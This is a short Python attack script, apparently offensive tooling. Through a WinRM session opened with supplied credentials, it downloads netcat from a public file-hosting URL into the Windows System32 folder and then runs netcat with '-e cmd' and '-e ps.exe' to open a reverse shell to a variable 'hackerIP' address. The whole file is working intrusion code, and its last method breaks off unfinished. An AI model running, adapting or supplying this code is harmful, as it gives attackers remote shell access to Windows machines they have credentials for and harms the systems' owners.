import winrm

NC_DOWNLOAD_LOC = "https://srv-file4.gofile.io/download/NPrGVL/nc.exe"

class WinRM:
	def __init__(self, hackerIP, hackerPORT, ip, username, password):
		self.hackerIP = hackerIP
		self.hackerPORT = str(hackerPORT)
		self.ip = ip
		self.username = username
		self.password = password
		self.session = winrm.Session(self.ip, auth=(self.username, self.password))

	def testRM(self):
		result = self.session.run_cmd("ipconfig")
		if result.status_code == 0:
			print("winrm successful")
			return True 
		else:
			print("winrm unsuccessful")
			return False

	def downloadNC(self):
		#result = self.session.run_cmd("bitsadmin /transfer myDownloadJob /download /priority normal "+NC_DOWNLOAD_LOC+" c:\windows\system32\nc.exe")
		result = self.session.run_ps("Invoke-WebRequest -Uri "+NC_DOWNLOAD_LOC+" -OutFile c:\windows\system32\nc.exe")
		if result.status_code == 0:
			print("netcat successfully downloaded and added to system32")
			return True
		else:
			print("netcat cannot be downloaded to system machine")
			return False

	def runNCsession(self):
		result = self.session.run_cmd("nc "+self.hackerIP+" "+self.hackerPORT+" -e cmd")
		if result.status_code == 0:
			print("netcat session successful")
			return True
		else:
			print("netcat session not successful")
			return False

	def runNCsessionPS(self):
		result = self.session.run_cmd("nc "+self.hackerIP+" "+self.hackerPORT+" -e ps.exe")
